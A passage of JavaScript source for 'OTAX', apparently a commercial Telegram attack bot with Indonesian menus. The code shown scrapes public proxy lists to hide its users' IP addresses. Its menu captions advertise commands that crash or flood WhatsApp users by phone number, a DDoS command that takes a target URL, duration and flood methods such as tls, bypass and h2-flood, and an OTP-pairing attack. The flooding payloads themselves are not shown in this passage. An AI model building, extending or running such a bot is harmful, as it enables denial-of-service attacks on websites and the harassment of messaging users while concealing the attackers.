    "https://raw.githubusercontent.com/zloi-user/hideip.me/main/http.txt",
    "https://raw.githubusercontent.com/zloi-user/hideip.me/main/https.txt",
    "https://raw.githubusercontent.com/elliottophellia/proxylist/master/results/http/global/http_checked.txt",
    "https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/https/https.txt",
  ];

  let proxies = [];

 
  try {
        if (fs.existsSync("proxt.txt")) {
            fs.unlinkSync("proxt.txt");
            logToFileAndConsole("proxt.txt lama berhasil dihapus");
        }
         if (fs.existsSync("proxy.txt")) {
            fs.unlinkSync("proxy.txt");
            logToFileAndConsole("proxy.txt lama berhasil dihapus");
        }
    } catch (error) {
        logToFileAndConsole(`Error deleting old proxy files: ${error.message}`);
    }

    
    for (const source of proxySources) {
        try {
            const response = await axios.get(source);
            proxies = proxies.concat(response.data.split("\n").filter(proxy => proxy.trim() !== '')); 
        } catch (error) {
            logToFileAndConsole(
                `Error scraping proxies from ${source}: ${error.message}`
            );
        }
    }

    
    try {
        fs.writeFileSync("proxt.txt", proxies.join("\n"));
        logToFileAndConsole("Proxies successfully scraped and saved to proxt.txt");

        fs.writeFileSync("proxy.txt", proxies.join("\n"));
        logToFileAndConsole("Proxies successfully scraped and saved to proxy.txt");

    } catch (error) {
        logToFileAndConsole(`Error writing proxy files: ${error.message}`);
    }
}
// [========================================] //
async function scrapeUserAgent() {
  try {
    const response = await fetch('https://raw.githubusercontent.com/rafael453322/PROXYDT/main/proxy.json.txt');
    const data = await response.text();
    fs.writeFileSync('ua.txt', data, 'utf-8');
  } catch (error) {
    console.error(`Error fetching data: ${error.message}`);
  }
}
// [========================================] //
function clearUserAgent() {
  if (fs.existsSync('ua.txt')) {
    fs.unlinkSync('ua.txt');
  }
}

clearUserAgent();
scrapeProxies();
scrapeUserAgent();
const nama = "OTAX";
const author = "OTAX";


let videoCache = null;
let videoCachePath = null;

function loadVideoToCache() {
  if (videoCache) return videoCache;

  const videoPath = path.join(__dirname, "./assets/videos/video.mp4");
  if (fs.existsSync(videoPath)) {
    videoCachePath = videoPath;
    videoCache = fs.readFileSync(videoPath);
    return videoCache;
  }
  return null;
}


//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

bot.onText(/\/updateproxy/, (msg) => {
if (shouldIgnoreMessage(msg)) return;
  const chatId = msg.chat.id;
  scrapeProxies();
  const message = "Proxy Updated.";
  bot.sendMessage(chatId, message);
});
// Handler untuk command /proxycount
bot.onText(/\/proxycount/, (msg) => {
  const chatId = msg.chat.id;
if (shouldIgnoreMessage(msg)) return;
  fs.readFile("proxy.txt", "utf8", (err, data) => {
    if (err) {
      bot.sendMessage(
        chatId,
        "Gagal membaca file proxy.txt. Pastikan file tersebut ada dan bisa diakses."
      );
      logToFileAndConsole(`Error reading proxy.txt: ${err.message}`);
      return;
    }

    // Pisahkan setiap baris yang ada di file proxy.txt
    const proxies = data.split("\n").filter(Boolean);
    const proxyCount = proxies.length;

    bot.sendMessage(
      chatId,
      `Jumlah proxy yang ada di proxy.txt: ${proxyCount}`
    );
    logToFileAndConsole(`Sent proxy count: ${proxyCount} to chat ${chatId}`);
  });
});

// func bug

function generateMessageID() {
    return Math.floor(Math.random() * 1e10).toString();
}

//habis func 
function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}
async function sleep(ms) {
  await new Promise(resolve => setTimeout(resolve, ms));
}

const bugRequests = {};   
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
   const delay = ms => new Promise(res => setTimeout(res, ms));
  const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";
  const premiumStatus = getPremiumStatus(senderId);  
  const runtime = getBotRuntime();
  const randomImage = getRandomImage();
  
if (shouldIgnoreMessage(msg)) return;

  
  bot.sendPhoto(chatId, "https://files.catbox.moe/4v8phs.png", {
    caption: `\`\`\`
━━━【𝕆𝕋𝔸𝕏】━━━ 一緒
𝙃𝙖𝙡𝙤 𝘽𝙖𝙣𝙜 ${username} 𝙨𝙚𝙡𝙖𝙢𝙖𝙩 𝙢𝙚𝙣𝙜𝙜𝙪𝙣𝙖𝙠𝙖𝙣 "𝙊𝙏𝘼𝙓" 𝘽𝙚𝙧𝙗𝙞𝙟𝙖𝙠𝙡𝙖𝙝 𝙙𝙖𝙡𝙖𝙢 𝙢𝙚𝙣𝙜𝙜𝙪𝙣𝙖𝙠𝙖𝙣
 ━━━【𝙊𝙏𝘼】━━━
亗 𝑶𝑻𝑨𝑿 𝑨𝑳𝑾𝑨𝒀𝑺 𝑭𝑶𝑹 𝒀𝑶𝑼 亗
    ✘𝙄𝙣𝙛𝙤𝙧𝙢𝙖𝙨𝙞𝙊𝙏𝘼𝙓×͜×
➥ 所有者 : @Otapengenkawin
➥ バージョン : 3.0 ᴘʀᴏ ɢᴇɴ 2
➥ プレミアムステータス : ${premiumStatus}  
➥ ランタイム : ${runtime}  
➥ あなたのID : ${senderId}  

ᝰ.ᐟ 𝑺𝒆𝒍𝒂𝒍𝒖 𝒃𝒂𝒄𝒂 𝒔𝒆𝒕𝒊𝒂𝒑 𝒊𝒏𝒇𝒐𝒓𝒎𝒂𝒔𝒊 𝒚𝒂𝒏𝒈 𝒅𝒊𝒃𝒆𝒓𝒊𝒌𝒂𝒏

×͜× ᴘᴇɴᴄᴇᴛ sᴀʟᴀʜ sᴀᴛᴜ ᴛᴏᴍʙᴏʟ ᴅɪʙᴀᴡᴀʜ ᴜɴᴛᴜᴋ ᴍᴇᴍᴜʟᴀɪ ᴏᴛᴀx

\`\`\``,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [
          { text: "𝙿𝙴𝙽𝙶𝙰𝚃𝚄𝚁𝙰𝙽 ✘", callback_data: "setting" },
          { text: "𝙾𝚆𝙽𝙴𝚁 ✘", callback_data: "owner_menu" },
            { text: "𝚃𝚀𝚃𝙾 ✘", callback_data: "tqto" }
        ],
        [
          { text: "𝙳𝙳𝙾𝚂 ✘", callback_data: "ddos" },
          { text: "𝚃𝙾𝙾𝙻𝚂 ✘", callback_data: "tools" }
        ],
          [
          { text: "𝙾𝚃𝙰𝚇 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘", callback_data: "trashmenu" }
        ]
      ]
    }
  });
});

bot.on("callback_query", async (query) => {
  try {
    const chatId = query.message.chat.id;
    const messageId = query.message.message_id;
    const username = query.from.username ? `@${query.from.username}` : "Tidak ada username";
    const senderId = query.from.id;
    const runtime = getBotRuntime();
    const premiumStatus = getPremiumStatus(query.from.id);
    const randomImage = getRandomImage();

    let caption = "";
    let replyMarkup = {};

    if (query.data === "trashmenu") {
      caption = `\`\`\`
━━━【𝕆𝕋𝔸𝕏】━━━
𝗢𝗧𝗔𝗫 𝗩.3 𝗣𝗥𝗢 𝗚𝗘𝗡 2
╭▄︻デʍɛռʊ ɮʊɢ═══━一
┃    バグメニュー
━━━【𝗜𝗻𝘃𝗶𝘀𝗶𝗯𝗹𝗲】━━━
┃╰┈➤ /O-Iɴᴠᴇᴢ ✆ 62xx
┃ᝰ.ᐟ ᴘᴇɴʏᴇᴘᴏɴɢ ᴋᴜᴏᴛᴀ + ɪɴᴠsɪʙʟᴇ ᴇᴀsʏ ᴅᴇʟᴀʏ
┃╰┈➤ /O-Invis ✆ 62xx
┃ᝰ.ᐟ ᴘᴇɴʏᴇᴘᴏɴɢ ᴋᴜᴏᴛᴀ + ɪɴᴠsɪʙʟᴇ ᴍᴇᴅɪᴜᴍ ᴅᴇʟᴀʏ
┃╰┈➤ /O-Superinvis ✆ 62xx
┃ᝰ.ᐟ ᴘᴇɴʏᴇᴘᴏɴɢ ᴋᴜᴏᴛᴀ + ɪɴᴠsɪʙʟᴇ ʜᴀʀᴅ ᴅᴇʟᴀʏ
┃╰┈➤ /O-Tᴀɴ ✆ 62xx
┃ᝰ.ᐟ  ɪɴᴠɪsɪʙʟᴇ ᴅᴇʟᴀʏ
┃╰┈➤ /O-Fc ✆ 62xx
┃ᝰ.ᐟ  ɪɴᴠɪsɪʙʟᴇ ғᴄ
━━━【𝗩𝗶𝘀𝗶𝗯𝗹𝗲】━━━
┃╰┈➤ /O-Super ✆ 62xx
┃ᝰ.ᐟ ᴄʀᴀsʜ ᴜɪ/ʙʟᴀɴᴋ x ᴅᴇʟᴀʏ
┃╰┈➤ /O-Delay ✆ 62xx
┃ᝰ.ᐟ ᴅᴇʟᴀʏ - sᴛɪᴄᴋᴇʀ
┃╰┈➤ /O-Combo ✆ 62xx
┃ᝰ.ᐟ ᴍɪx - ᴘᴏᴡᴇʀ
┃╰┈➤ /O-Crash ✆ 62xx
┃ᝰ.ᐟ ᴄʀᴀsʜ ᴡʜᴀᴛsᴀᴘᴘ
┃╰┈➤ /O-Ios ✆ 62xx
┃ᝰ.ᐟ ᴊᴀɴᴅᴀ ᴘᴇɴɢɢᴏᴅᴀ ɪᴏs
┃╰┈➤ /O-Visiblefc ✆ 62xx
┃ᝰ.ᐟ ᴠɪsɪʙʟᴇ ғᴏʀᴄʟᴏsᴇ
━━━【𝗕𝘂𝗴 𝗚𝗿𝗼𝘂𝗽】━━━
┃╰┈➤ /O-Group (LinkGroup)
┃ᝰ.ᐟ ʙᴜɢ ɢʀᴏᴜᴘ
𝙉𝘽 : 𝘚𝘦𝘯𝘥𝘦𝘳 𝘞𝘢𝘫𝘪𝘣 𝘔𝘦𝘯𝘨𝘨𝘶𝘯𝘢𝘬𝘢𝘯 𝘞𝘢 𝘉𝘪𝘢𝘴𝘢 / 𝘉𝘶𝘬𝘢𝘯 𝘉𝘪𝘴𝘯𝘪𝘴
━━━【𝗧𝘆𝗽𝗲 𝗦𝗽𝗮𝗺】━━━
┃╰┈➤ /O-Clear ✆ 62xx
┃ᝰ.ᐟ 𝙐𝙣𝙩𝙪𝙠 𝘾𝙡𝙚𝙖𝙧 𝘽𝙪𝙜
╰━━━━━━━━━━━━━━━༉‧.
𝗡𝗯 : 𝘐𝘯𝘷𝘪𝘴𝘪𝘣𝘭𝘦 : 𝘛𝘪𝘥𝘢𝘬 𝘛𝘦𝘳𝘭𝘪𝘩𝘢𝘵
     𝘝𝘪𝘴𝘪𝘣𝘭𝘦  : 𝘛𝘦𝘳𝘭𝘪𝘩𝘢𝘵
━━━【𝗣𝗲𝗻𝘁𝗶𝗻𝗴!!】━━━
Jika Sender Ingin Tidak Mudah Kenon / Spam Maka Bisa Menggunakan Bug Type Invisible / Tidak Terlihat!
\`\`\``;
      replyMarkup = { inline_keyboard: [[{ text: "𝙺𝙴𝙼𝙱𝙰𝙻𝙸 ツ", callback_data: "back_to_main" }]] };
    }
    if (query.data === "ddos") {
      caption = `\`\`\`
━━━【𝕆𝕋𝔸𝕏】━━━
𝗢𝗧𝗔𝗫 𝗩.3 𝗣𝗥𝗢 𝗚𝗘𝗡 2
╭▄︻デмєиυ ∂∂οѕ═══━一
┃    バグメニュー
━━━【𝗗𝗗𝗢𝗦】━━━
┃╰┈➤ /O-Aᴛᴛᴀᴄᴋ <ᴜʀʟ> <ᴅᴜʀᴀᴛɪᴏɴ> <ᴍᴇᴛᴏᴅᴇ>
┃ᝰ.ᐟ ᴄᴏɴᴛᴏʜ ɴɪʜ : /O-Aᴛᴛᴀᴄᴋ xɴxx.ᴄᴏᴍ 1200 ғʟᴏᴏᴅ
━━━【𝗠𝗘𝗧𝗢𝗗𝗘】━━━
┃ᝰ.ᐟ flood
┃ᝰ.ᐟ tls
┃ᝰ.ᐟ vip
┃ᝰ.ᐟ bypass
┃ᝰ.ᐟ storm
┃ᝰ.ᐟ strike
┃ᝰ.ᐟ glory
┃ᝰ.ᐟ kill 
┃ᝰ.ᐟ tlsvip 
┃ᝰ.ᐟ cas
┃ᝰ.ᐟ h2-flash
┃ᝰ.ᐟ pidoras
┃ᝰ.ᐟ h2-flood 
━━━【𝗧𝗢𝗢𝗟𝗦】━━━
┃╰┈➤ /ᴛʀᴀᴄᴋɪᴘ <IP Aᴅᴅʀᴇs>
┃ᝰ.ᐟ ᴄᴇᴋ ɪɴғᴏʀᴍᴀsɪ ɪᴘ
┃╰┈➤ /ᴋɪʟʟᴏᴛᴘ ✆ 62xx
┃ᝰ.  ᴀᴛᴛᴀᴄᴋ ᴘᴀɪʀɪɴɢ
━━━【𝗣𝗲𝗻𝘁𝗶𝗻𝗴!!】━━━
ᴅᴅᴏs ᴀᴅᴀʟᴀʜ sᴇʀᴀɴɢᴀɴ ᴡᴇʙ ʏᴀɴɢ ʙᴇʀsɪғᴀᴛ ɪʟʟᴇɢᴀʟ ʜᴀᴛɪ ʜᴀᴛɪ ᴀᴋᴀɴ ᴅᴀᴍᴘᴀᴋ ᴘᴇɴʏᴇʀᴀɴɢᴀɴ , "ᴏᴛᴀx" sᴜᴅᴀʜ ᴅɪ ᴍᴏᴅɪғɪᴋᴀsɪ ᴅᴇɴɢᴀɴ ᴘʀᴏxʏ (ᴘᴇɴʏᴀᴍᴀʀᴀɴ ɪᴘ) ᴀɢᴀʀ ɪᴘ ᴘᴇɴɢɢᴜɴᴀ ᴛɪᴅᴀᴋ ᴛᴇʀᴅᴇᴛᴇᴄᴛ
┃╰┈➤ /ᴜᴘᴅᴀᴛᴇᴘʀᴏxʏ 
┃ᝰ.ᐟ ᴜᴘᴅᴀᴛᴇ ᴘʀᴏxʏ ʙᴀʀᴜ
┃╰┈➤ /ᴘʀᴏxʏᴄᴏᴜɴᴛ
┃ᝰ.ᐟ ᴘᴇɴɢʜɪᴛᴜɴɢᴀɴ ᴘʀᴏxʏ ʏᴀɴɢ ᴛᴇʀᴘᴀᴋᴀɪ
╰━━━━━━━━━━━━━━━༉‧.
\`\`\``;
      replyMarkup = { inline_keyboard: [[{ text: "𝙺𝙴𝙼𝙱𝙰𝙻𝙸 ツ", callback_data: "back_to_main" }]] };
    }
    if (query.data === "setting") {
      caption = `\`\`\`
╭━━━【𝕆𝕋𝔸𝕏】━━━
┃ᝰ.ᐟ 所有者  : @Otapengenkawin
┃ᝰ.ᐟ バージョン : 3.0 ᴘʀᴏ ɢᴇɴ 2
┃ᝰ.ᐟ ランタイム : ${runtime}
╰⋆━━━━━━━━━━━━━━━━━━༉‧.
༺𓆩❟❛❟𓆪༻⋆𝘖𝘛𝘈𝘟⋆༺𓆩❟❛❟𓆪༻⋆
╭━( 𝕀𝕟𝕗𝕠𝕣𝕞𝕒𝕤𝕚 )
┃ᝰ.ᐟ ユーザー : ${username}
┃ᝰ.ᐟ ユーザーID : ${senderId}
┃ᝰ.ᐟ プレミアムステータス : ${premiumStatus}
╰━━━━━━━━━━━━━━━━━━༉‧.
╭━( ᴘᴇɴɢᴀᴛᴜʀᴀɴ )
┃ᝰ.ᐟ /sᴇᴛᴊᴇᴅᴀ <5ᴍ>
┃ᝰ.ᐟ /ᴀᴅᴅᴘʀᴇᴍ <ɪᴅ>
┃ᝰ.ᐟ /ᴅᴇʟᴘʀᴇᴍ <ɪᴅ>
┃ᝰ.ᐟ /ᴄᴇᴋᴘʀᴇᴍ
┃ᝰ.ᐟ /ᴀᴅᴅᴀᴅᴍɪɴ <ɪᴅ>
┃ᝰ.ᐟ /ʀᴇǫᴘᴀɪʀ 62×××
┃ᝰ.ᐟ /ᴇɴᴄᴊᴀᴠᴀ
┃ᝰ.ᐟ /ᴄᴇᴋɪᴅᴄʜ <ʟɪɴᴋ>
┃ᝰ.ᐟ /ᴏɴ (ᴀᴋᴛɪғ ᴀɪ)
┃ᝰ.ᐟ /ᴏғғ (ɴᴏɴᴀᴋᴛɪғ ᴀɪ)
┃ᝰ.ᐟ /sᴇᴛᴡᴇʟᴄᴏᴍᴇ <ᴛᴇᴋs>
┃ᝰ.ᐟ /ᴡᴇʟᴄᴏᴍᴇᴏɴ
┃ᝰ.ᐟ /ᴡᴇʟᴄᴏᴍᴇᴏғғ
┃ᝰ.ᐟ /sᴇᴛɢᴏᴏᴅʙʏᴇ <ᴛᴇᴋs>
┃ᝰ.ᐟ /ɢᴏᴏᴅʙʏᴇᴏɴ
┃ᝰ.ᐟ /ɢᴏᴏᴅʙʏᴇᴏғғ
┃ᝰ.ᐟ /ɢʀᴏᴜᴘᴏɴ
┃ᝰ.ᐟ /ɢʀᴏᴜᴘᴏғғ
┃ᝰ.ᐟ /ᴀᴅᴅɢʀᴏᴜᴘ
┃ᝰ.ᐟ /ᴅᴇʟɢʀᴏᴜᴘ
┃ᝰ.ᐟ /sᴛᴀᴛᴜs (ᴄᴇᴋ sᴛᴀᴛᴜs)
╰━━━━━━━━━━━━━━━━━━༉‧.


\`\`\``;
      replyMarkup = { inline_keyboard: [[{ text: "𝙺𝙴𝙼𝙱𝙰𝙻𝙸 ツ", callback_data: "back_to_main" }]] };
    }
    if (query.data === "owner_menu") {
      caption = `\`\`\`
╭━━━【𝕆𝕋𝔸𝕏】━━━
┃ᝰ.ᐟ 所有者  : @Otapengenkawin
┃ᝰ.ᐟ バージョン : 3.0 𝘗𝘳𝘰 𝘎𝘦𝘯 1.3
┃ᝰ.ᐟ ランタイム : ${runtime}
╰⋆━━━━━━━━━━━━━━━━━━༉‧.
༺𓆩❟❛❟𓆪༻⋆𝘖𝘛𝘈𝘟⋆༺𓆩❟❛❟𓆪༻⋆
╭━( 𝕀𝕟𝕗𝕠𝕣𝕞𝕒𝕤𝕚 )
┃ᝰ.ᐟ ユーザー : ${username}
┃ᝰ.ᐟ ユーザーID : ${senderId}
┃ᝰ.ᐟ プレミアムステータス : ${premiumStatus}
╰━━━━━━━━━━━━━━━━━━༉‧.
༺𓆩❟❛❟𓆪༻⋆𝘖𝘛𝘈𝘟⋆༺𓆩❟❛❟𓆪༻⋆
╭━( 𝚘𝚠𝚗𝚎𝚛 𝙼𝙴𝙽𝚄 )
┃ᝰ.ᐟ /ᴀᴅᴅᴀᴅᴍɪɴ <ɪᴅ>
┃ᝰ.ᐟ /ᴅᴇʟᴀᴅᴍɪɴ <ɪᴅ>
┃ᝰ.ᐟ /ᴀᴅᴅᴘʀᴇᴍ <ɪᴅ>
┃ᝰ.ᐟ /ᴅᴇʟᴘʀᴇᴍ <ɪᴅ>
┃ᝰ.ᐟ /ʟɪsᴛᴘᴀɪʀ
┃ᝰ.ᐟ /ᴅᴇʟᴘᴀɪʀ
╰━━━━━━━━━━━━━━━━━━༉‧.
╭━( ᴘᴀʏᴍᴇɴᴛ ᴏᴡɴᴇʀ )
┃ᝰ.ᐟ /qris
┃ᝰ.ᐟ /dana
┃ᝰ.ᐟ /ovo
┃ᝰ.ᐟ /gopay
╰━━━━━━━━━━━━━━━━━━༉‧.
\`\`\``;
      replyMarkup = { inline_keyboard: [[{ text: "𝙺𝙴𝙼𝙱𝙰𝙻𝙸 ツ", callback_data: "back_to_main" }]] };
    }
    if (query.data === "tools") {
      caption = `\`\`\`
╭━━━【𝕆𝕋𝔸𝕏】━━━
┃ᝰ.ᐟ 所有者  : @Otapengenkawin
┃ᝰ.ᐟ バージョン : 3.0 ᴘʀᴏ ɢᴇɴ 2
┃ᝰ.ᐟ ランタイム : ${runtime}
╰━━━━━━━━━━━━━━━━━━༉‧.
⋆༺𓆩❟❛❟𓆪༻⋆𝘖𝘛𝘈𝘟⋆༺𓆩❟❛❟𓆪༻⋆⋆
╭━( ᴄʀᴇᴀᴛᴇ ᴘᴀɴᴇʟ )
┃ᝰ.ᐟ /1ɢʙ ᴜsᴇʀ, ɪᴅ ᴛᴇʟᴇ
┃ᝰ.ᐟ /2ɢʙ ᴜsᴇʀ, ɪᴅ ᴛᴇʟᴇ
┃ᝰ.ᐟ /3ɢʙ ᴜsᴇʀ, ɪᴅ ᴛᴇʟᴇ
┃ᝰ.ᐟ /4ɢʙ ᴜsᴇʀ, ɪᴅ ᴛᴇʟᴇ
┃ᝰ.ᐟ /5ɢʙ ᴜsᴇʀ, ɪᴅ ᴛᴇʟᴇ
┃ᝰ.ᐟ /6ɢʙ ᴜsᴇʀ, ɪᴅ ᴛᴇʟᴇ
┃ᝰ.ᐟ /7ɢʙ ᴜsᴇʀ, ɪᴅ ᴛᴇʟᴇ
┃ᝰ.ᐟ /8ɢʙ ᴜsᴇʀ, ɪᴅ ᴛᴇʟᴇ
┃ᝰ.ᐟ /9ɢʙ ᴜsᴇʀ,ɪᴅ ᴛᴇʟᴇ
┃ᝰ.ᐟ /10ɢʙ ᴜsᴇʀ,ɪᴅ ᴛᴇʟᴇ
┃ᝰ.ᐟ /11ɢʙ ᴜsᴇʀ,ɪᴅ ᴛᴇʟᴇ
┃ᝰ.ᐟ /ᴜɴʟɪ ᴜsᴇʀ,ɪᴅ ᴛᴇʟʟᴇ
┃ᝰ.ᐟ /ᴄʀᴇᴀᴛᴇᴀᴅᴍɪɴ ᴜsᴇʀ,ɪᴅ ᴛᴇʟᴇ
┃ᝰ.ᐟ /ᴅᴇʟsrv
┃ᝰ.ᐟ /ʟɪsᴛsrv
┃ᝰ.ᐟ /ɪɴsᴛᴀʟʟᴘᴀɴᴇʟ
┃ᝰ.ᐟ /ᴜɴɪɴsᴛᴀʟʟᴘᴀɴᴇʟ
┃ᝰ.ᐟ /ʜᴀᴄᴋʙᴀᴄᴋ
╰━━━━━━━━━━━━━━━━━━༉‧.
╭━( Mᴇɴᴜ Lᴀɪɴ )
┃ᝰ.ᐟ /ᴛᴛ <ᴜʀʟ>
┃ᝰ.ᐟ /ᴍᴇᴅɪᴀғɪʀᴇ <ᴜʀʟ>
┃ᝰ.ᐟ /ɢɪᴛʜᴜʙ <ᴜʀʟ>
┃ᝰ.ᐟ /ᴘʟᴀʏ <ᴛᴇʀsᴇʀᴀʜ ʟᴜ>
┃ᝰ.ᐟ /ᴛᴏᴜʀʟ
╰━━━━━━━━━━━━━━━━━━༉‧. 
\`\`\``;
      replyMarkup = { inline_keyboard: [[{ text: "𝙺𝙴𝙼𝙱𝙰𝙻𝙸 ツ", callback_data: "back_to_main" }]] };
    }
    
     if (query.data === "tqto") {
      const pesan = `\`\`\`
      ᴛʜᴀɴᴋs ғᴏʀ ᴀʟʟ ʙᴜʏʏᴇʀ sᴄʀɪᴘᴛ ᴀɴᴅ ᴍʏ ᴘᴀʀᴛɴᴇʀs / ᴘᴀʀᴛɴᴇʀ ᴘʀɪᴠᴀᴛᴇ ᴄᴀᴜsᴇ ʏᴏᴜ ᴏᴛᴀx ᴄᴀɴ sᴛᴀɴᴅ ᴛʜɪs ғᴀʀ ᴀɴᴅ ʙᴇ ᴀs ɢʀᴇᴀᴛ ᴀs ɪᴛ ʙʏ ᴀʟᴡᴀʏs ᴜsɪɴɢ ᴏᴛᴀx ᴇᴠᴇɴ ᴛʜᴏᴜɢʜ ɪᴛ ɪs ɴᴏᴛ ᴀs ɢʀᴇᴀᴛ ᴀs ᴛʜᴇ ᴏᴛʜᴇʀs ✘
༺𓆩❟❛❟𓆪༻⋆𝘖𝘛𝘈𝘟⋆༺𓆩❟❛❟𓆪༻⋆
╭━( 𝕋𝕙𝕒𝕟𝕜𝕤 𝕋𝕠 )
┃ᝰ.ᐟ ᴀʟʟᴀʜ [ ᴍʏ ɢᴏᴅ ]
┃ᝰ.ᐟ ʙᴜɴᴅᴀʜᴀʀᴀ 
┃ᝰ.ᐟ ᴏᴛᴀ [ ᴅᴇᴠ¹ ]
┃ᝰ.ᐟ ᴀʏᴜɴ [ ᴅᴇᴠ² ]
┃ᝰ.ᐟ ʟᴏᴛᴜs [ sᴜᴘᴘᴏʀᴛ ]
┃ᝰ.ᐟ ᴅʀᴀɢᴏɴ [ sᴜᴘᴘᴏʀᴛ ]
┃ᝰ.ᐟ ᴍᴇᴢᴢᴜ [ ᴛᴀɴɢᴀɴ ᴋᴀɴᴀɴ ]
┃ᝰ.ᐟ ʀʏᴜʜɪᴍᴜʀᴀ [ ᴛᴀɴɢᴀɴ ᴋᴀɴᴀɴ ]
┃ᝰ.ᐟ ᴊᴀʏᴢ [ ᴛᴀɴɢᴀɴ ᴋᴀɴᴀɴ ]
┃ᝰ.ᐟ ʙᴀʟᴢ [ ᴛᴀɴɢᴀɴ ᴋᴀɴᴀɴ ]
┃ᝰ.ᐟ sᴋʏᴢᴇᴢ [ ᴛᴀɴɢᴀɴ ᴋᴀɴᴀɴ ]
┃ᝰ.ᐟ xɴᴇʟᴄʀᴏᴡ [ ᴛᴀɴɢᴀɴ ᴋᴀɴᴀɴ ]
┃ᝰ.ᐟ ʟᴇx [ ᴛᴀɴɢᴀɴ ᴋᴀɴᴀɴ ]
┃ᝰ.ᐟ sᴀʀɪᴘ -444 [ ᴘᴀʀᴛɴᴇʀ ]
┃ᝰ.ᐟ ᴅɪxᴇʏ [ ᴘᴀʀᴛɴᴇʀ ]
┃ᝰ.ᐟ ɪ'ᴍ sᴋʏ [ ᴘᴀʀᴛɴᴇʀ ]
┃ᝰ.ᐟ ᴢᴇɴɪᴛʜ [ ᴘᴀʀᴛɴᴇʀ ]
┃ᝰ.ᐟ ʟᴜxxʏ [ ᴘᴀʀᴛɴᴇʀ ]
┃ᝰ.ᐟ ᴋɪᴛᴇᴛ [ ᴘᴀʀᴛɴᴇʀ ]
┃ᝰ.ᐟ ᴡᴀᴍᴢ [ ᴘᴀʀᴛɴᴇʀ ]
┃ᝰ.ᐟ sᴀᴛᴜʀɴ [ ᴘᴀʀᴛɴᴇʀ ]
┃ᝰ.ᐟ ᴍɪᴋᴀᴢᴜ [ ᴘᴀʀᴛɴᴇʀ ]
┃ᝰ.ᐟ ᴀxᴢᴢ [ ᴘᴀʀᴛɴᴇʀ ]
┃ᝰ.ᐟ ᴘᴜᴛᴘᴀʏ [ ᴘᴀʀᴛɴᴇʀ ]
┃ᝰ.ᐟ ʏᴀɴɴ [ ᴘᴀʀᴛɴᴇʀ ]
┃ᝰ.ᐟ xᴇɴᴏ [ ᴘᴀʀᴛɴᴇʀ ]
┃ᝰ.ᐟ ғᴀɴᴛ [ ᴘᴀʀᴛɴᴇʀ ]
┃ᝰ.ᐟ ᴘᴀᴛᴢʏ [ ᴘᴀʀᴛɴᴇʀ ]
┃ᝰ.ᐟ ʟᴀɴɢᴢ [ ᴘᴀʀᴛɴᴇʀ ]
┃ᝰ.ᐟ ɢᴀʟᴀxʏ ᴍᴀɴᴢʏ [ ᴘᴀʀᴛɴᴇʀ ]
┃ᝰ.ᐟ ɴᴏᴇʟᴢ [ ᴘᴀʀᴛɴᴇʀ ]
┃ᝰ.ᐟ ᴄᴀᴄᴀ [ ᴘᴀʀᴛɴᴇʀ ]
┃ᝰ.ᐟ ᴅᴏʟᴢ [ ᴘᴀʀᴛɴᴇʀ ]
┃ᝰ.ᐟ ʏsᴄᴇʟʟ [ ᴘᴀʀᴛɴᴇʀ ]
┃ᝰ.ᐟ sᴋʏᴢᴏ [ ᴘᴀʀᴛɴᴇʀ ]
┃ᝰ.ᐟ ᴠɪɴᴢx [ ᴘᴀʀᴛɴᴇʀ ]
┃ᝰ.ᐟ sʜᴏᴜ [ ᴘᴀʀᴛɴᴇʀ ]
┃ᝰ.ᐟ ᴢᴢᴀɴ ʙᴇʟᴀɴᴅᴀ [ ᴘᴀʀᴛɴᴇʀ ]
┃ᝰ.ᐟ ʟɪᴍᴠᴢx [ ᴘᴀʀᴛɴᴇʀ ]
┃ᝰ.ᐟ xᴛʀᴀ [ ᴘᴀʀᴛɴᴇʀ ]
┃ᝰ.ᐟ ғᴀɴᴢᴢ [ ᴘᴀʀᴛɴᴇʀ ]
┃ᝰ.ᐟ ᴇɪᴍᴀɴ [ ᴘᴀʀᴛɴᴇʀ ]
┃ᝰ.ᐟ ᴢᴜᴇ [ ᴘᴀʀᴛɴᴇʀ ]
┃ᝰ.ᐟ ᴢᴜᴘᴘᴇʀ [ ᴘᴀʀᴛɴᴇʀ ]
┃ᝰ.ᐟ sᴇᴍᴜᴀ ᴘᴇᴍʙᴇʟɪ sᴄʀɪᴘᴛ
╰━━━━━━━━━━━━━━━༉‧.
\`\`\``;
bot.sendMessage(chatId, pesan, { parse_mode: "Markdown" });
      replyMarkup = { inline_keyboard: [[{ text: "𝙺𝙴𝙼𝙱𝙰𝙻𝙸 ツ", callback_data: "back_to_main" }]] };
    }
        if (query.data === "back_to_main") {
      caption = `\`\`\`
╭━━━【𝕆𝕋𝔸𝕏】━━━
┃ᝰ.ᐟ 所有者  : @Otapengenkawin
┃ᝰ.ᐟ バージョン : 3.0 ᴘʀᴏ ɢᴇɴ 2
┃ᝰ.ᐟ ランタイム : ${runtime}
╰⋆━━━━━━━━━━━━━━━━━━༉‧.
༺𓆩❟❛❟𓆪༻⋆𝘖𝘛𝘈𝘟⋆༺𓆩❟❛❟𓆪༻⋆
╭━( 𝕀𝕟𝕗𝕠𝕣𝕞𝕒𝕤𝕚 )
┃ᝰ.ᐟ ユーザー : ${username}
┃ᝰ.ᐟ ユーザーID : ${senderId}
┃ᝰ.ᐟ プレミアムステータス : ${premiumStatus}
╰━━━━━━━━━━━━━━━━━━༉‧.
╭━( sᴏʟᴜsɪ ʟɪᴍɪᴛ )
┃ᝰ.ᐟ /otax <pesan lu>
┃ᴍᴇɴɢɪʀɪᴍ ᴘᴇsᴀɴ ᴋᴇ ᴅᴇᴠᴇʟᴏᴘᴇʀ ʙᴏᴛ x ᴏᴛᴀ
┃ᝰ.ᐟ /owner <pesan lu>
┃ᴍᴇɴɢɪʀɪᴍ ᴘᴇsᴀɴ ᴋᴇ ᴏᴡɴᴇʀ ʙᴏᴛ
╰━━━━━━━━━━━━━━━━━━༉‧.
Спасибо, что используете "OTAX" как свою силу, когда вы подавлены и устали, я "OTA" хочу сказать большое спасибо тем из вас, кто всегда поддерживает меня.Я здесь, пока не смогу быть по-другому

\`\`\``;
